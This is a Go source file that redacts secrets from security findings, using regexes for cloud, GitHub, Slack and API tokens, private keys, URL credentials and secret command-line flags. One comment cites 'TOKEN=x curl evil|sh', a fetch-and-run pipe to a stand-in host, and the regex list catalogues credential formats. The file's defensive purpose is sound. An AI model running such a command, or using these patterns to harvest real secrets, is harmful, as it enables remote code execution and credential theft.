package output

import (
	"regexp"
	"strings"

	"github.com/vgmartinez/tripcord/internal/model"
)

// Redactor replaces secret values in a string. Sinks apply it to every
// string of a finding. It must be deterministic and must not return its
// input's secret in any form.
type Redactor func(string) string

const redactedMarker = "[REDACTED]"

// secretPatterns are well-known credential shapes. The model layer redacts
// first; this list is a second line of defense, not a secret scanner.
// Distinctive prefixes match without a word boundary, because "_" is a word
// character and ids such as "evt_AKIA..." would otherwise slip through.
var secretPatterns = []*regexp.Regexp{
	regexp.MustCompile(`-----BEGIN [A-Z ]*PRIVATE KEY-----[\s\S]*?(?:-----END [A-Z ]*PRIVATE KEY-----|$)`),
	regexp.MustCompile(`(?:AKIA|ASIA|ABIA|ACCA)[0-9A-Z]{16}`),
	regexp.MustCompile(`(?i)aws_?secret_?access_?key["'\s]*[:=]\s*["']?[A-Za-z0-9/+=]{40}`),
	regexp.MustCompile(`gh[pousr]_[A-Za-z0-9]{36,255}`),
	regexp.MustCompile(`github_pat_[A-Za-z0-9_]{22,255}`),
	regexp.MustCompile(`glpat-[A-Za-z0-9_-]{20,}`),
	regexp.MustCompile(`(?:\b|_)sk-(?:ant-|proj-)?[A-Za-z0-9_-]{20,}`),
	regexp.MustCompile(`[sr]k_live_[0-9A-Za-z]{20,}`),
	regexp.MustCompile(`xox[abprs]-[A-Za-z0-9-]{10,}`),
	regexp.MustCompile(`xapp-[0-9]+-[A-Za-z0-9-]{8,}`),
	regexp.MustCompile(`npm_[A-Za-z0-9]{20,}`),
	regexp.MustCompile(`hf_[A-Za-z0-9]{20,}`),
	regexp.MustCompile(`ya29\.[A-Za-z0-9._-]{20,}`),
	regexp.MustCompile(`AIza[0-9A-Za-z_-]{35}`),
	regexp.MustCompile(`\beyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}`),
	regexp.MustCompile(`(?i)\bbearer\s+[A-Za-z0-9._~+/-]{20,}=*`),
	regexp.MustCompile(`https://hooks\.slack\.com/(?:services|workflows|triggers)/[A-Za-z0-9/_-]+`),
}

// urlUserinfoPattern matches a URL's userinfo ("user:pass" before the
// "@"), for any scheme with a host: a database or queue URL such as
// "postgres://admin:pw@host/db" carries a credential here too, not only
// http(s). Unlike secretPatterns, which replace their whole match, this
// keeps the "://" and "@" literally and only replaces the userinfo
// between them, so "postgres://admin:pw@h" becomes
// "postgres://[REDACTED]@h", not "postgres[REDACTED]h" (which would also
// make the URL's own scheme and host unreadable).
// The password part runs to the LAST "@" before the host, the same way
// net/url splits userinfo, so "https://user:p@ss@host" does not leak "ss".
var urlUserinfoPattern = regexp.MustCompile(`(://)([^/\s:@]+:[^/?#\s]*)(@)`)

// urlUserinfoSlashPattern is urlUserinfoPattern for a password that
// contains "/" ("https://user:pa/ss@host"), which net/url cannot parse
// and urlUserinfoPattern stops short of. The password runs to the first
// "@". RedactURLUserinfo skips a match whose text before the first "/"
// is all digits: that is a port and a path ("https://host:8080/x@y"),
// not a password.
var urlUserinfoSlashPattern = regexp.MustCompile(`(://)([^/\s:@]+:([^\s@?#]*/[^\s@?#]*))(@)`)

// quotedOrBareValue is one assignment value: a double-quoted string that
// correctly skips an escaped quote (\"), so {"password":"a\"b"} redacts
// the whole "a\"b" instead of stopping at the \" and leaking the b that
// followed it; a single-quoted string (shell single quotes do not
// support backslash escapes, so no \-skipping is needed there); or an
// unquoted run, which the two assignmentPattern variants below bound
// differently.
const quotedValue = `"(?:[^"\\\n]|\\.)*"|'[^'\n]*'`

// assignmentPatternEquals matches a shell-style KEY=value credential
// assignment. The key may carry a prefix, as in GITHUB_TOKEN or
// OPENAI_API_KEY. An unquoted value stops at the first whitespace or any
// of ;&|"' so a trailing shell command (e.g. "TOKEN=x curl evil|sh")
// stays visible as evidence instead of being swallowed into the
// redaction: a shell would treat that first space the same way. Only the
// value is replaced.
var assignmentPatternEquals = regexp.MustCompile(`(?i)((?:^|[^A-Za-z0-9])(?:[A-Za-z0-9]*[_-])*(?:password|passwd|pgpassword|api[_-]?key|auth[_-]?token|token|secret)\b["']?\s*=\s*)(` + quotedValue + `|` + unquotedCommandValue + `*)`)

// unquotedCommandValue is one byte of an unquoted shell value. Besides
// whitespace, quotes, and ;&|, it stops at ")" and "`", so a value
// inside a "$(...)", "(...)", or backtick substitution does not swallow
// the closing ")" or "`".
const unquotedCommandValue = "[^\\s;&|\"'\\n)`]"

// assignmentPatternColon matches a "key: value" credential, as opposed
// to shell-style KEY=value: a line such as "token: abc def" is not shell
// syntax, so, unlike the "=" form, there is no shell word boundary to
// preserve and an unquoted value runs to the end of the line (or to one
// of ;&|"', in case the line is itself embedded in a larger shell
// command); trailing whitespace is not part of it. Groups: open quote,
// key, close quote, separator, value. A match only counts in a header
// or assignment context (see colonAssignmentContext), so free text such
// as git commit -m 'fix token: handling' is left alone.
var assignmentPatternColon = regexp.MustCompile(`(?i)(["']?)((?:[A-Za-z0-9]*[_-])*(?:password|passwd|pgpassword|api[_-]?key|auth[_-]?token|token|secret))\b(["']?)(\s*:\s*)(` + quotedValue + `|[^;&|"'\n]*)`)

// authorizationPattern matches an Authorization header or JSON field with a
// Bearer, Basic, or token scheme, in both header ("Authorization: Bearer x")
// and quoted/JSON ("Authorization":"Bearer x") spellings. The value is not
// length-limited, and a closing quote is never consumed.
var authorizationPattern = regexp.MustCompile(`(?i)(authorization["']?\s*:\s*["']?(?:bearer|basic|token)\s+)([^\s;&|"']+)`)

// SecretFlags lists the long-flag spellings whose value is a credential:
// the --token/--secret/--password/--api-key family and a few common
// longer names. It deliberately excludes -u/--user (see RedactUserFlags,
// which also requires a "user:pass" value) and all short flags such as
// -t, -k, and -p: those mean something unrelated for most commands (ssh
// -t allocates a tty, curl -k skips TLS verification) and are redacted
// only for the specific tools in toolSecretFlags. It is exported so the
// Claude Code adapter's own, first-line flag redaction (parse.go's
// commandSecretFlag) recognizes exactly the same flags as this
// second-line DefaultRedactor, instead of the two lists drifting apart.
var SecretFlags = []string{
	"token", "secret", "password", "api-key", "apikey", "api_key",
	"client-secret", "client_secret", "access-token", "access_token",
	"auth-token", "auth_token", "http-password",
	"secret-access-key", "secret_access_key",
}

// secretFlagWordAlternation is SecretFlags as a regexp alternation of
// bare words (no leading dashes), each escaped with regexp.QuoteMeta.
func secretFlagWordAlternation() string {
	parts := make([]string, len(SecretFlags))
	for i, flag := range SecretFlags {
		parts[i] = regexp.QuoteMeta(flag)
	}
	return strings.Join(parts, "|")
}

// SecretFlagAlternation returns a regexp alternation that matches any
// SecretFlags word with either one or two leading dashes ("-token" or
// "--token"): some tools accept a single-dash spelling of an otherwise
// "long" flag. It does not itself require a trailing separator or a
// leading word boundary; callers add both.
func SecretFlagAlternation() string {
	return `--?(?:` + secretFlagWordAlternation() + `)`
}

// UserFlagAlternation matches curl's user/password flag in any spelling
// it accepts. The longer spellings come first: with leftmost-first
// alternation, "-u" listed first would match the start of "-user" and
// read "ser" as a glued value, leaking "-user alice:s3cret".
const UserFlagAlternation = `--proxy-user|--user|-user|-u`

// LooksLikeUserPass reports whether value has curl's "user:pass" shape:
// a non-empty name, a literal ":", and a (possibly empty) password. It
// first strips one layer of matching quotes, so `"alice:s3cret"` and
// 'alice:s3cret' are both recognized. This gates -u/--user redaction so
// a non-credential use such as "sudo -u root" (no colon) is left alone.
func LooksLikeUserPass(value string) bool {
	if len(value) >= 2 {
		quote := value[0]
		if (quote == '"' || quote == '\'') && value[len(value)-1] == quote {
			value = value[1 : len(value)-1]
		}
	}
	i := strings.IndexByte(value, ':')
	return i > 0
}

// secretFlagPattern matches a SecretFlags flag and its value, with "="
// or whitespace after the flag name, never glued onto the value, so
// "--user-agent x" or "--tokenizer gpt2" is not read as a flag. The flag
// may itself be quoted ("--token" abc). Groups: open quote, flag, close
// quote, then either "=" and its value or whitespace and its value. The
// value uses the quotedValue grammar, so a whole quoted phrase such as
// `--password "correct horse battery"` is redacted as one value. An
// unquoted space-separated value never starts with "-", so
// "--token --verbose" does not eat the next flag; an "=" value may
// ("--token=-abc"), since "=" unambiguously ends the flag name.
// RedactSecretFlags checks the left word boundary itself.
var secretFlagPattern = regexp.MustCompile(`(?i)(["']?)(` + SecretFlagAlternation() + `)(["']?)(?:(=)(` + quotedValue + `|` + unquotedCommandValue + `*)|(\s+)(` + quotedValue + `|[^-\s;&|"'\n)` + "`" + `]` + unquotedCommandValue + `*))`)

// literalArgFlags are flags whose argument is literal text (a commit
// message, a grep pattern), not a command line: a secret flag name
// right after one is that text, as in grep -e --token file.
var literalArgFlags = map[string]bool{"-e": true, "--regexp": true, "-m": true, "--message": true, "--grep": true}

// RedactSecretFlags replaces the value of every SecretFlags flag in
// value ("--token X", "--token=X", "--token 'X'") with [REDACTED], kept
// in the value's own quotes, and returns the raw values it removed, with
// those quotes stripped. An empty or placeholder value ("--token=",
// "--token $TOKEN") is left alone, as is a flag name that is the
// argument of a literalArgFlags flag.
func RedactSecretFlags(value string) (string, []string) {
	var removed []string
	var b strings.Builder
	pos := 0
	for pos < len(value) {
		m := secretFlagPattern.FindStringSubmatchIndex(value[pos:])
		if m == nil {
			break
		}
		for i := range m {
			if m[i] >= 0 {
				m[i] += pos
			}
		}
		start, end := m[0], m[1]
		openQuote, closeQuote := value[m[2]:m[3]], value[m[6]:m[7]]
		sepEnd, valStart, valEnd := m[9], m[10], m[11]
		if m[8] < 0 {
			sepEnd, valStart, valEnd = m[13], m[14], m[15]
		}
		body := value[valStart:valEnd]
		if !wordBoundaryBefore(value, start) ||
			(closeQuote != "" && closeQuote != openQuote) ||
			literalArgFlags[previousWord(value, start)] ||
			placeholderSecret(body) {
			b.WriteString(value[pos : start+1])
			pos = start + 1
			continue
		}
		removed = append(removed, unquote(body))
		b.WriteString(value[pos:sepEnd])
		b.WriteString(quoteLike(body, redactedMarker))
		pos = end
	}
	b.WriteString(value[pos:])
	return b.String(), removed
}

// wordBoundaryBefore reports whether offset starts a shell word: the
// start of text or right after whitespace. Without it, the optional
// single dash of SecretFlagAlternation would match the "-password"
// inside a compound word such as "find-generic-password".
func wordBoundaryBefore(value string, offset int) bool {
	return offset == 0 || isCommandSpace(value[offset-1])
}

// previousWord returns the whitespace-separated word ending before
// offset, without surrounding quotes.
func previousWord(value string, offset int) string {
	before := strings.TrimRight(value[:offset], " \t\r\n")
	if i := strings.LastIndexAny(before, " \t\r\n"); i >= 0 {
		before = before[i+1:]
	}
	return strings.Trim(before, `"'`)
}

// unquote strips one layer of matching single or double quotes.
func unquote(value string) string {
	if len(value) >= 2 {
		quote := value[0]
		if (quote == '"' || quote == '\'') && value[len(value)-1] == quote {
			return value[1 : len(value)-1]
		}
	}
	return value
}

// userFlagPattern matches curl's -u/--user/-user flag and its value:
// "-u value", "-u=value", or glued ("-uuser:pass", curl's documented
// short form). Groups: boundary, flag, separator, value.
var userFlagPattern = regexp.MustCompile(`(?i)(^|\s)(` + UserFlagAlternation + `)(=|\s+|)(` + quotedValue + `|` + unquotedCommandValue + `*)`)

// RedactUserFlags replaces the value of a curl-style -u/--user/-user flag
// with [REDACTED] when it has "user:pass" shape, and returns the raw
// values it removed. A non-credential use such as "sudo -u root" is left
// alone. The glued form is accepted only for "-u": "-userX" is read as
// "-u" plus "serX", and "--userX" (such as "--user-agent") is never a
// user flag at all. It is shared by DefaultRedactor and the Claude Code
// adapter's source-side redaction, so both phases agree.
func RedactUserFlags(value string) (string, []string) {
	var removed []string
	out := userFlagPattern.ReplaceAllStringFunc(value, func(match string) string {
		g := userFlagPattern.FindStringSubmatch(match)
		boundary, flag, separator, body := g[1], g[2], g[3], g[4]
		if separator == "" {
			switch strings.ToLower(flag) {
			case "-u":
			case "-user":
				body = flag[2:] + body
				flag = flag[:2]
			default:
				return match
			}
		}
		if !LooksLikeUserPass(body) || placeholderSecret(body) {
			return match
		}
		removed = append(removed, strings.Trim(body, `"'`))
		return boundary + flag + separator + quoteLike(body, redactedMarker)
	})
	return out, removed
}

// DefaultRedactor replaces well-known credential shapes with [REDACTED].
// Already-redacted text, such as "sk-***REDACTED***abcd", is unchanged.
func DefaultRedactor(value string) string {
	value = authorizationPattern.ReplaceAllString(value, "${1}"+redactedMarker)
	value, _ = RedactSecretFlags(value)
	value, _ = RedactUserFlags(value)
	value, _ = RedactToolFlags(value)
	value, _ = RedactURLUserinfo(value)
	for _, pattern := range secretPatterns {
		value = pattern.ReplaceAllString(value, redactedMarker)
	}
	value, _ = RedactAssignments(value)
	return value
}

// RedactCommand applies the command-line rules DefaultRedactor shares
// with the adapters' source-side sanitizers: secret flags
// (RedactSecretFlags), curl user flags (RedactUserFlags), tool-specific
// flags (RedactToolFlags), URL userinfo (RedactURLUserinfo), and
// credential assignments (RedactAssignments). It returns the redacted
// text and the raw values it removed, so a source-side key
// discriminator hashes exactly what the output side hides.
func RedactCommand(value string) (string, []string) {
	value, removed := RedactSecretFlags(value)
	value, user := RedactUserFlags(value)
	value, tool := RedactToolFlags(value)
	value, userinfo := RedactURLUserinfo(value)
	value, assign := RedactAssignments(value)
	removed = append(removed, user...)
	removed = append(removed, tool...)
	removed = append(removed, userinfo...)
	return value, append(removed, assign...)
}

// RedactURLUserinfo replaces the "user:pass" userinfo of every URL in
// value with [REDACTED] and returns the raw userinfo it removed.
func RedactURLUserinfo(value string) (string, []string) {
	var removed []string
	value = urlUserinfoPattern.ReplaceAllStringFunc(value, func(match string) string {
		g := urlUserinfoPattern.FindStringSubmatch(match)
		removed = append(removed, g[2])
		return g[1] + redactedMarker + g[3]
	})
	value = urlUserinfoSlashPattern.ReplaceAllStringFunc(value, func(match string) string {
		g := urlUserinfoSlashPattern.FindStringSubmatch(match)
		if port := g[3][:strings.IndexByte(g[3], '/')]; port != "" && strings.Trim(port, "0123456789") == "" {
			return match
		}
		removed = append(removed, g[2])
		return g[1] + redactedMarker + g[4]
	})
	return value, removed
}

// RedactAssignments redacts a credential-named "key=value" or "key: value"
// assignment, such as PGPASSWORD=..., npm's :_authToken=..., or a
// YAML/JSON "token: ..." line, the same way DefaultRedactor's second line
// does. It returns the redacted text and the raw values it removed.
func RedactAssignments(value string) (string, []string) {
	var removed []string
	value = assignmentPatternEquals.ReplaceAllStringFunc(value, redactAssignment(assignmentPatternEquals, &removed))
	value = redactColonAssignments(value, &removed)
	return value, removed
}

// redactColonAssignments applies assignmentPatternColon where
// colonAssignmentContext accepts the match.
func redactColonAssignments(value string, removed *[]string) string {
	var b strings.Builder
	pos := 0
	for pos < len(value) {
		m := assignmentPatternColon.FindStringSubmatchIndex(value[pos:])
		if m == nil {
			break
		}
		for i := range m {
			if m[i] >= 0 {
				m[i] += pos
			}
		}
		start := m[0]
		openQuote, closeQuote := value[m[2]:m[3]], value[m[6]:m[7]]
		raw := value[m[10]:m[11]]
		ok, stop := colonAssignmentContext(value, start, openQuote, closeQuote)
		if i := strings.IndexAny(raw, stop); stop != "" && i >= 0 && raw[0] != '"' && raw[0] != '\'' {
			raw = raw[:i]
		}
		body := strings.TrimRight(raw, " \t\r")
		if !ok || (start > 0 && isAlnum(value[start-1])) || placeholderSecret(body) {
			b.WriteString(value[pos : start+1])
			pos = start + 1
			continue
		}
		*removed = append(*removed, strings.Trim(body, `"'`))
		b.WriteString(value[pos:m[10]])
		b.WriteString(quoteLike(body, redactedMarker))
		pos = m[10] + len(body)
	}
	b.WriteString(value[pos:])
	return b.String()
}

// colonAssignmentContext reports whether a "key: value" match starting at
// offset is a header or assignment rather than free text: a quoted key
// ("token": ...), a key at the start of a line (YAML, an env file, or a
// whole header string, optionally as a "- " list item), a key right
// after "{" or "," (a flow mapping), or a curl -H/--header argument.
// stop lists the bytes that end an unquoted value in that context: ","
// and "}" in a mapping, whitespace in an unquoted header argument, and
// nothing extra on a line of its own.
func colonAssignmentContext(value string, offset int, openQuote, closeQuote string) (ok bool, stop string) {
	before := value[:offset]
	line := before[strings.LastIndexByte(before, '\n')+1:]
	trimmedBefore := strings.TrimRight(before, " \t")
	switch {
	case openQuote != "" && openQuote == closeQuote,
		strings.HasSuffix(trimmedBefore, "{"), strings.HasSuffix(trimmedBefore, ","):
		return true, ",}"
	case strings.TrimSpace(line) == "", strings.TrimSpace(line) == "-":
		return true, ""
	}
	header := false
	switch prefix := before[strings.LastIndexAny(before, " \t\r\n")+1:]; prefix {
	case "":
		word := previousWord(value, offset)
		header = word == "-H" || word == "--header"
	case "-H", "-H=", "--header=":
		header = true
	}
	if !header {
		return false, ""
	}
	if openQuote == "" {
		return true, " \t"
	}
	return true, ""
}

func isAlnum(c byte) bool {
	return c >= '0' && c <= '9' || c >= 'a' && c <= 'z' || c >= 'A' && c <= 'Z'
}

func redactAssignment(pattern *regexp.Regexp, removed *[]string) func(string) string {
	return func(match string) string {
		parts := pattern.FindStringSubmatch(match)
		if len(parts) != 3 || placeholderSecret(parts[2]) {
			return match
		}
		value := parts[2]
		if strings.HasPrefix(value, "-") && isCommandSpace(parts[1][len(parts[1])-1]) {
			return match
		}
		*removed = append(*removed, strings.Trim(value, `"'`))
		if len(value) >= 2 {
			quote := value[0]
			if (quote == '"' || quote == '\'') && value[len(value)-1] == quote {
				return parts[1] + string(quote) + redactedMarker + string(quote)
			}
		}
		return parts[1] + redactedMarker
	}
}

func placeholderSecret(value string) bool {
	inner := strings.Trim(strings.TrimSpace(value), `"'`)
	if inner == "" || strings.HasPrefix(inner, "$") || strings.HasPrefix(inner, "<") || strings.HasPrefix(strings.ToLower(inner), "your-") {
		return true
	}
	switch strings.ToLower(inner) {
	case "changeme", "example", "placeholder", "todo", "xxx", "redacted", "[redacted]":
		return true
	default:
		return false
	}
}

// redactFinding returns a deep copy of finding with redact applied to every
// string except the closed vocabularies and the validated fingerprint.
func redactFinding(finding model.Finding, redact Redactor) model.Finding {
	out := finding
	out.Rule = redact(finding.Rule)
	out.Title = redact(finding.Title)
	out.Fix = redact(finding.Fix)
	out.Location.Session = redact(finding.Location.Session)
	out.Location.Path = redact(finding.Location.Path)
	if finding.Location.Line != nil {
		line := *finding.Location.Line
		out.Location.Line = &line
	}
	if finding.Evidence != nil {
		out.Evidence = make([]model.Evidence, len(finding.Evidence))
		for i, evidence := range finding.Evidence {
			out.Evidence[i] = model.Evidence{
				Event:   redact(evidence.Event),
				Excerpt: redact(evidence.Excerpt),
			}
			if evidence.Config != nil {
				out.Evidence[i].Config = &model.ConfigRef{ID: redact(evidence.Config.ID), Key: redact(evidence.Config.Key)}
			}
		}
	}
	if finding.Refs != nil {
		out.Refs = make([]string, len(finding.Refs))
		for i, ref := range finding.Refs {
			out.Refs[i] = redact(ref)
		}
	}
	return out
}
